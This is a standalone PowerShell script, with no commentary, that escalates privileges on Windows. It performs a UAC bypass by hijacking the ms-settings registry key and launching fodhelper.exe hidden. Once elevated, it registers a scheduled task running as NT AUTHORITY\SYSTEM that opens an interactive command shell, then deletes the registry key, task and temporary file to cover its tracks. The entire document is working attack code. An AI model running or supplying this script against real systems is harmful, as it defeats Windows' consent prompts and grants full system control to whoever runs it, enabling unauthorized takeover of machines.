$CurrentIdentity = [Security.Principal.WindowsIdentity]::GetCurrent()
$Principal = New-Object Security.Principal.WindowsPrincipal($CurrentIdentity)

if (-not $Principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host "[*] Elevating via fodhelper..." -ForegroundColor Yellow
    
    $RegPath = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"
    $Command = "powershell.exe -ExecutionPolicy Bypass -NoExit -File `"$PSCommandPath`""
    
    New-Item -Path $RegPath -Force | Out-Null
    New-ItemProperty -Path $RegPath -Name "DelegateExecute" -Value "" -Force | Out-Null
    Set-ItemProperty -Path $RegPath -Name "(Default)" -Value $Command | Out-Null
    
    Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
    Start-Sleep -Seconds 2
    Remove-Item -Path "HKCU:\Software\Classes\ms-settings" -Recurse -Force -ErrorAction SilentlyContinue
    exit
}

Write-Host "[+] Running as Administrator" -ForegroundColor Green
Remove-Item -Path "HKCU:\Software\Classes\ms-settings" -Recurse -Force -ErrorAction SilentlyContinue

Write-Host "[*] Method: Scheduled Task with Interactive flag..." -ForegroundColor Cyan

$TaskName = "LoSys_$((Get-Random -Maximum 9999))"
$XmlTask = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <TimeTrigger>
      <StartBoundary>1999-01-01T00:00:00</StartBoundary>
      <Enabled>false</Enabled>
    </TimeTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>false</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>false</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>cmd.exe</Command>
      <Arguments>/k "title SYSTEM SHELL &amp; color 0a &amp; whoami &amp; echo. &amp; echo You are NT AUTHORITY\SYSTEM"</Arguments>
    </Exec>
  </Actions>
</Task>
"@

$TempXml = "$env:TEMP\$TaskName.xml"
Set-Content -Path $TempXml -Value $XmlTask -Encoding Unicode

schtasks /Create /TN $TaskName /XML $TempXml /F 2>&1 | Out-Null
Remove-Item $TempXml -Force

Write-Host "[+] Task created: $TaskName" -ForegroundColor Green
Write-Host "[*] Launching interactive SYSTEM shell..." -ForegroundColor Cyan

schtasks /Run /I /TN $TaskName 2>&1 | Out-Null

Start-Sleep -Seconds 2

schtasks /Delete /TN $TaskName /F 2>&1 | Out-Null
Write-Host "[+] Cleanup done" -ForegroundColor Green

Write-Host "`n[!] Look for the GREEN CMD window!" -ForegroundColor Magenta
Write-Host "    It runs as NT AUTHORITY\SYSTEM" -ForegroundColor White

Write-Host "`nPress any key to exit..." -ForegroundColor Cyan
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
